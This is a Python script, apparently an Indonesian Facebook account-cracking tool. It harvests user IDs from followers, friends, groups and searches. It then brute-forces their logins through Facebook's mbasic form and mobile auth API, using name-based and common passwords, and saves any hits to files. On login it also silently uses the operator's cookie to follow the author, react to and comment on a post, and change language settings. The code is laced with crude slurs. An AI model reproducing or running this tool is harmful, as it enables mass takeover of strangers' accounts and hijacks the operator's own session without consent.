# Mau Ngapain Ngapain Bro?:v
# fb me : https://m.facebook.com/Kang.Pacman
import os,sys,re,random,json
from time import sleep as waktu
from concurrent.futures import ThreadPoolExecutor as Bool
ok=0
cp=0
die=0
live=[]
chek=[]
def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try:
	import requests as req
except ModuleNotFoundError:
	os.system("python -m pip install requests");restart()
try:
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
	os.system("python -m pip install bs4");restart()
try:
	ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip()
except req.exceptions.ConnectionError:
	exit("[!] Kesalahan Pada Koneksi")
def hasil(ngocok,ismylife):
	if len(ngocok) != 0 or len(ismylife) != 0:
		print(f"\n\n[+] Done\n[+] LIVE : {len(ngocok)}\n[+] CHEK : {len(ismylife)}")
		if len(ngocok)==0:pass
		else:print("[+] Hasil Live Tersimpan Di File : live.txt")
		if len(ismylife)==0:pass
		else:print("[+] Hasil Chek Tersimpan Di File : chek.txt")
		exit()
	else:exit("\n[!] Tidak Mendapatkan Hasil:(")
def crackmbasic(user,pw):
	global ok,cp,die
	data={}
	ses=req.Session()
	ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
	a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
	b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
	for c in a("input"):
		try:
			if c.get("name") in b:data.update({c.get("name"):c.get("value")})
			else:continue
		except:pass
	data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
	d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
	if "c_user" in d.cookies:
		ok+=1
		print(f"\r\x1b[1;32m[LIVE] {user} | {pw}          \x1b[0m",end="")
		print("")
		open("live.txt","a").write(user+" | "+pw+"\n")
		live.append(user+pw)
	elif "checkpoint" in d.cookies:
		cp+=1
		print(f"\r\x1b[1;33m[CHEK] {user} | {pw}          \x1b[0m",end="")
		print("")
		open("chek.txt","a").write(user+" | "+pw+"\n")
		chek.append(user+pw)
	else:
		die+=1
	print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
def crackapi(user,pw):
	global ok,cp,die
	ses=req.Session()
	api="https://b-api.facebook.com/method/auth.login"
	param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
	send=ses.get(api,params=param)
	if "session_key" in send.text and "EAAA" in send.text:
		ok+=1
		print(f"\r\x1b[1;32m[LIVE] {user} | {pw}          \x1b[0m",end="")
		print("")
		open("live.txt","a").write(user+" | "+pw+"\n")
		live.append(user+pw)
	elif "www.facebook.com" in send.json()["error_msg"]:
		cp+=1
		print(f"\r\x1b[1;33m[CHEK] {user} | {pw}          \x1b[0m",end="")
		print("")
		open("chek.txt","a").write(user+" | "+pw+"\n")
		chek.append(user+pw)
	else:
		die+=1
	print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
class ngentod:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
		self.id=[]
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol) 
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("id=(.*?)&",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				else:
					self.id.append(softek[0]+"[SagiriWaifuGw:v]"+softek[1])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
			if "Lihat Selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def babaturan(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
			if "Lihat selengkapnya" in kontol:
				self.babaturan(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def memekgrup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				else:
					self.id.append(softek[0]+"[SagiriWaifuGw:v]"+softek[1])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
			if "Lihat Selengkapnya" in kontol:
				self.memekgrup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def teangan(self,hencet):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			for softek in memek:
				if "profile.php?" in softek[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"[SagiriWaifuGw:v]"+softek[2])
				elif "?refid=" in softek[1]:
					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"[SagiriWaifuGw:v]"+softek[2])
				else:
					self.id.append(softek[1]+"[SagiriWaifuGw:v]"+softek[2])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
				if len(self.id)==1000:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.teangan(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"))
		except:pass
	def flrencang(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
			if "Lihat Teman Lain" in kontol:
				self.flrencang(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
		except:pass
	def menta(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
			if "Lihat selengkapnya" in kontol:
				self.menta(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def menu(self):
		about().tentang()
		pilih=input("[?] Pilih : ")
		if pilih in["1","01"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
			else:
				memek=f"{self.url}/{kontol}?v=followers"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					self.folower(memek)
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["2","02"]:
			self.babaturan(f"{self.url}/friends/center/friends/")
		elif pilih in["3","03"]:
			while True:
				kontol=input("[?] Masukkan Id Grup : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						else:
							self.memekgrup(f"{self.url}/browse/group/members/?id={kontol}");break
					except req.exceptions.ConnectionError:
						exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["4","04"]:
			while True:
				kontol=input("[?] Nama : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
						if "Maaf, kami tidak menemukan" in ajg:
							print(f"[!] Pengguna Dengan Nama {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						else:
							self.teangan(f"{self.url}/search/people/?q={kontol}");break
					except req.exceptions.ConnectionError:
						exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["5","05"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
					print(f"[!] Daftar Teman Tidak Di Publikasikan");waktu(2);self.menu()
				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					self.flrencang(memek)
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["6","06"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Permintaan" in ajg:
					print("[!] Permintaan Pertemanan Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					self.menta(f"{self.url}/friends/center/requests/#friends_center_main")
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih=="99":
			try:os.remove("cookie")
			except:os.system("rm cookie")
			exit()
		elif pilih in["0","00"]:
			exit("[+] Thank You For Using My Tool")
		else:
			print("[!] Pilihan Tidak Ada");self.menu()
		print("\n\n[+] Pilih Metode Crack")
		print("[01] Crack Dari Api Fb [Crack Cepat, Kemungkinan CP Semua]")
		print("[02] Crack Dari mbasic [Crack Lumayan Cepat, Kemungkinan CP Berkurang]")
		self.ngontol()
	def ngontol(self):
		nanya=input("[?] Pilih : ")
		if nanya in[""," "]:
			print("[!] Jangan Kosong Bro");self.ngontol()
		elif nanya in["1","01"]:
			print("\n[+] Starting Crack..\n")
			with Bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[SagiriWaifuGw:v]")
						xu=xi[1]
						xe=xu.split(" ")
						if len(xe)==1:
							pewe=[xe[0],xe[0]+"123",xe[0]+"12345","Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						elif len(xe)==2:
							pewe=[xe[1],xe[0]+"123",xe[0]+"12345",xe[1]+"123",xe[1]+"12345","Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						elif len(xe)==3:
							pewe=[xe[2],xe[0]+"123",xe[0]+"12345",xe[2]+"123",xe[2]+"12345","Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						elif len(xe)==4:
							pewe=[xe[3],xe[0]+"123",xe[0]+"12345",xe[3]+"123",xe[3]+"12345","Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						else:
							pewe=["Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						for pwas in pewe:
							tokai.submit(crackapi,xi[0],pwas)
					except:pass
			hasil(live,chek)
		elif nanya in["2","02"]:
			print("\n[+] Starting Crack..\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[SagiriWaifuGw:v]")
						xu=xi[1]
						xe=xu.split(" ")
						if len(xe)==1:
							pewe=[xe[0],xe[0]+"123",xe[0]+"12345","Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						elif len(xe)==2:
							pewe=[xe[1],xe[0]+"123",xe[0]+"12345",xe[1]+"123",xe[1]+"12345","Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						elif len(xe)==3:
							pewe=[xe[2],xe[0]+"123",xe[0]+"12345",xe[2]+"123",xe[2]+"12345","Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						elif len(xe)==4:
							pewe=[xe[3],xe[0]+"123",xe[0]+"12345",xe[3]+"123",xe[3]+"12345","Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						else:
							pewe=["Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						for pwas in pewe:
							tokai.submit(crackmbasic,xi[0],pwas)
					except:pass
			hasil(live,chek)
		else:
			print("[!] Isi Yang Bener Ajg");self.ngontol()
class hehe:
	def __init__(self,cok):
		self.url="https://mbasic.facebook.com"
		self.kuki=cok
# Jangan Dirubah Ajg!!!:v
	def react(self):
		try:
			true=False
			kontol=req.get(f"{self.url}/886758932080337",cookies=self.kuki).text
			if "/reactions/picker/?is_permalink=1" in kontol:
				aap_ganteng=re.search('href\=\"\/reactions\/picker\/(.*?)"',kontol).group(1).replace(";","&")
				anjirlu=f"{self.url}/reactions/picker/{aap_ganteng}"
				true=True
			if true==True:
				asu=parser(req.get(anjirlu,cookies=self.kuki).text,"html.parser")
				for ngontol in asu.find_all("a"):
					if "reaction_type=4" in str(ngontol):
						owh=req.get(f'{self.url}{ngontol.get("href")}',cookies=self.kuki).text
		except:pass
	def komen(self):
		try:
			kontol=req.get(f"{self.url}/886758932080337",cookies=self.kuki).text
			aap_ganteng=re.findall('<form method="post" action="(.*?)">',kontol)
			entod=parser(kontol,"html.parser")
			ewean=entod.find_all("input", {"type":"hidden"})
			anjirlu={}
			bacot=random.choice(["Aap Afandi Ganteng:)","Lo Ngentod:v","Yang Posting Orang Nya Ganteng:)","Mantap:v","Be Yourself And Never Surrentod:v"])
			for ckptw in ewean:
				try:
					anjirlu[ckptw["name"]]=ckptw["value"]
				except KeyError:
					anjirlu[ckptw["name"]]=""
			anjirlu["comment_text"]=bacot
			anjirlu["submit"]="Komentari"
			req.post(self.url+aap_ganteng[0].replace(";","&"),cookies=self.kuki,data=anjirlu)
		except:pass
	def tuturkeun(self):
		try:
			true=False
			cek=req.get(f"{self.url}/Kang.Pacman",cookies=self.kuki).text
			if "Ikuti" in cek:
				true=True
			if true==True:
				req.get(self.url+parser(cek,"html.parser").find("a",string="Ikuti").get("href"),cookies=self.kuki)
		except:pass
	def gak_bisa_bahasa_enggres(self):
		try:
			true=False
			cek=req.get(f"{self.url}/language.php",cookies=self.kuki).text
			if "Pilih Bahasa Anda" not in cek:
				true=True
			if true==True:
				req.get(self.url+parser(cek,"html.parser").find("a",string="Bahasa Indonesia").get("href"),cookies=self.kuki)
		except:pass
def logo():
	os.system("clear")
	print("""          ╔╦╗┌┐ ┌─┐  ╔═╗┌┐ v.1.0
          ║║║├┴┐├┤───╠╣ ├┴┐
          ╩ ╩└─┘└    ╚  └─┘
    -=[ Create By Kang Pacman ]=-
""")
class about:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
	def tentang(self):
		try:
			anjir=req.get(f"{self.url}/me/about",cookies=kueh).text
		except req.exceptions.ConnectionError:
			exit("[!] Kesalahan Pada Koneksi")
		if "Facebook - Masuk atau Daftar" in anjir or "Masuk ke Facebook" in anjir:
			os.remove("cookie");exit("[!] Cookies Kedaluwarsa, Harap Login Ulang")
		else:
			logo()
			#try:print("[•] Uid  : "+re.findall('Sebagai\<\/a\>\ · \<a\ href\=\"\/(.*?)\/allactivity\/"',anjir)[0])
			#except:pass
			try:print("[•] Nama : "+re.findall("\<title\>(.*?)<\/title\>",anjir)[0])
			except:pass
			#try:print("[•] Username      : "+re.findall('Facebook\<\/span\>\<\/div\>\<\/td\>\<td\ valign\=\"top\"\ class\=\"..\"\>\<div\ class\=\"..\"\> \/(.*?)<\/div\>',anjir)[0])
			#except:pass
			#try:print("[•] Tanggal Lahir : "+re.findall("Lahir tanggal (.*?)<\/span\>",anjir)[0])
			#except:pass
		print("\n[01] Crack Dari Followers")
		print("[02] Crack Dari Daftar Teman")
		print("[03] Crack Dari Member Group")
		print("[04] Crack Dari Pencarian Nama")
		print("[05] Crack Dari Daftar Teman Target")
		print("[06] Crack Dari Permintaan Pertemanan")
		print("[99] Logout")
		print("[00] Exit")
class asup:
	def __init__(self,cok):
		self.kuki=cok
	def login(self):
		try:
			cek=req.get("https://mbasic.facebook.com/me",cookies=self.kuki).text
			if "mbasic_logout_button" in cek:
				try:print("\n\n[+] Hai, Welcome "+re.findall("\<title\>(.*?)<\/title\>",cek)[0]+" Ngentod:v")
				except:pass
				a=hehe(self.kuki);a.gak_bisa_bahasa_enggres();a.tuturkeun();a.react();a.komen();open("cookie","w").write(self.kuki.get("cookie"));exit("[✓] Login Berhasil, Jalankan Ulang Tools Nya")
			else:
				exit("\n\n[!] Cookie Invalid")
		except req.exceptions.ConnectionError:
			exit("[!] Kesalahan Pada Koneksi")
if __name__=="__main__":
	try:
		kueh={"cookie":open("cookie").read()}
	except FileNotFoundError:
		os.system("clear")
		print("[!] Untuk Cara Mendapatkan Cookie Nya Cari Aja Di Yutub:V\n\n")
		while True:
			a=input("[?] Masukkan Cookie : ")
			if a in[""," "]:
				print("[!] Jangan Kosong")
			else:
				asup({"cookie":a}).login()
	ngentod().menu()
		
		
		
		